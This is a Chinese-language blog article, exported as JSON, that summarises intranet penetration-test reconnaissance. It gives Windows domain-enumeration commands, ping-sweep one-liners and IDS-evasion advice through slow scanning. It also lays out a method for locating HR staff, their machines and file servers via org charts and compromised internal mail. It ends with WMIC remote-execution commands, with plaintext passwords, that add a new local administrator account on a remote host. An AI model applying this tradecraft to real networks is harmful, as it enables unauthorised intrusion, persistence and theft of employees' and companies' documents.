{"title":"内网定位总结","slug":"内网定位总结","date":"2018-12-06T13:39:52.000Z","updated":"2018-12-07T09:27:18.616Z","comments":true,"path":"api/articles/内网定位总结.json","photos":[],"link":"","excerpt":"内网渗透测试定位技术总结服务器（机器）定位","covers":["https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/组织结构_.png","https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/010_2.png","https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/ping_C.png","https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/file_dingwei.png","https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/NETSESS_.png"],"content":"<h1 id=\"内网渗透测试定位技术总结\"><a href=\"#内网渗透测试定位技术总结\" class=\"headerlink\" title=\"内网渗透测试定位技术总结\"></a>内网渗透测试定位技术总结</h1><h2 id=\"服务器（机器）定位\"><a href=\"#服务器（机器）定位\" class=\"headerlink\" title=\"服务器（机器）定位\"></a>服务器（机器）定位</h2><a id=\"more\"></a>\n<blockquote>\n<p>收集域以及域内用户信息</p>\n<ul>\n<li>收集域内域控制器信息</li>\n<li>收集域控上域用户登录登录日志信息</li>\n<li>收集域内所有用户名以及全名、备注等信息</li>\n<li>收集域内工作组信息</li>\n<li>收集域管理员账号信息</li>\n<li>收集域内网段划分信息</li>\n<li>收集域内组织单位信息<br>常用命令<br><code>net view</code>查看域内用户列表<br><code>tasklist</code><br><code>Ipconfig /all</code> 查看网卡信息<br><code>Tasklist /v</code><br><code>Net use</code>查看当前主机的用户<br><code>net group /domain</code> 获得所有域用户组列表<br><code>net group “domain admins” /domain</code> 获得域管理员列表<br><code>net group “enterprise admins” /domain</code> 获得企业管理员列表<br><code>net localgroup administrators /domain</code> 获取域内置administrators组用户（enterprise admins、domain admins）<br><code>net group “domain controllers” /domain</code> 获得域控制器列表<br><code>net group “domain computers” /domain</code> 获得所有域成员计算机列表<br><code>net user /domain</code> 获得所有域用户列表<br><code>net user someuser /domain</code> 获得指定账户someuser的详细信息<br><code>net accounts /domain</code> 获得域密码策略设置，密码长短，错误锁定等信息<br><code>nltest /domain_trusts</code> 获取域信任信息<br>结构分析<br>从计算机名获取IP地址：<br><code>ping 计算机名</code><br>最后把所有得到的<code>domain admins</code>账号再<code>net user</code>下，为这些信息按内容分别建立文件进行分析。（抽空写个py脚本批量整理）<br>例如：</li>\n<li>Users.txt 存放和用户信息有关的内容</li>\n<li>Group.txt 存放和分组信息相关的内容<br>信息收集的姿势：</li>\n<li>人事组织结构图<br><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/组织结构_.png\" alt=\"来自网络\"><br>像这种组织架构图网上很容易就搜到了。还可以去对应公司的官网去找。<br>然后结合分析人事资料里相关员工全称与域内用户名对应关系，很快就能定位到需要定位的人员使用的机器。</li>\n<li>内部邮箱<br>现在一般企业对内网还不是很重视，拿下一两台主机是流程内的事。<br><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/010_2.png\" alt=\"某知名集团\"><br>然后进入内部工作邮箱，<br>可以从邮件头提取有用的信息。比如发件人IP，然后对照之前收集的，进一步确认内部人员名字以及关系。<br><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/mail_ip.png\" alt=\"\"></li>\n</ul>\n</blockquote>\n<ul>\n<li>系统自带工具<br>控制扫描的频率和速度，可以大大降低触发IDS的风险，针对windows机器，可以考虑用wmi脚本和powershell脚本进行扫描，低频扫描可以很容易的绕过IDS的规则，同时可以考虑使用内网管理工具使用的相同协议进行扫描探测。<br><strong>内网无工具扫描</strong><br>ping命令探测C段存活主机<br><code>for /1 %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i &quot;ttl&quot;</code><br><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/ping_C.png\" alt=\"\"><br>域机器对应的IP<br><code>FOR /F &quot;eol=- tokens=1 delims=\\ &quot; %a IN (&#39;net view&#39;) DO @(echo name: %a, ip: &amp; ping %a -w 1 -n 1 | find /i &quot;ttl&quot; &amp; echo.)</code></li>\n</ul>\n<h2 id=\"文件定位\"><a href=\"#文件定位\" class=\"headerlink\" title=\"文件定位\"></a>文件定位</h2><p>结合服务器定位总结出文件定位的大致思路：</p>\n<ul>\n<li>定位人力资源主管个人机</li>\n<li>定位人力资源相关文档存放位置</li>\n<li>从人力资源文档中找相关人</li>\n<li>定位相关人的机器</li>\n<li>监视相关人工作时存放文档的位置</li>\n<li>列出存放文档服务器的目录<br><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/file_dingwei.png\" alt=\"\"></li>\n</ul>\n<p>文件定位需要注意的点：</p>\n<ul>\n<li>产品名称</li>\n<li>内部名称</li>\n<li>项目负责人</li>\n<li>项目团队</li>\n<li>生产部（分公司，工厂，带工厂）<blockquote>\n<p>经验</p>\n</blockquote>\n</li>\n</ul>\n<ol>\n<li>FTP //一般用来存放文件</li>\n<li>SMB //文件共享</li>\n<li>产品管理系统（仓库管理系统）</li>\n<li>各种数据库</li>\n<li>其他服务器（分公司、工厂、代工厂）</li>\n</ol>\n<h2 id=\"管理员定位\"><a href=\"#管理员定位\" class=\"headerlink\" title=\"管理员定位\"></a>管理员定位</h2><blockquote>\n<p>工具<br>netsess.exe的原理是调用NetSessionEnum API，并且在远程主机上无需管理员权限。<br><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/NETSESS_.png\" alt=\"\"><br> PVEFindADUser.exe  // PVE查找AD用户<br> 用于枚举域用户以及登陆过特定系统的用户，需要管理员权限。工具描述：corelan<br> <img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/PVE_.png\" alt=\"\"><br>上面几个工具地址：<a href=\"https://github.com/langkexiansheng/Intranet-penetration\" target=\"_blank\" rel=\"noopener\">》》》</a><br>powershell<br>WMIC</p>\n<ul>\n<li>在远程系统上执行 bat 脚本<br><code>wmic /node:192.168.17.138 /user:test /password:!@#123QWE process call create c:\\programdata\\test.bat</code></li>\n</ul>\n</blockquote>\n<ul>\n<li><p>在远程系统上执行单条命令<br><code>wmic /node:192.168.17.138 /user:test /password:!@#123QWE process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add</code></p>\n</li>\n<li><p>在远程系统上运行exe文件<br><code>wmic /node:192.168.200.20 /user:web\\administrator /password:Web12345\nprocess call create &quot;cmd.exe /c calc.exe&quot;</code></p>\n</li>\n</ul>\n","categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","count":5,"path":"api/tags/内网渗透.json"}]}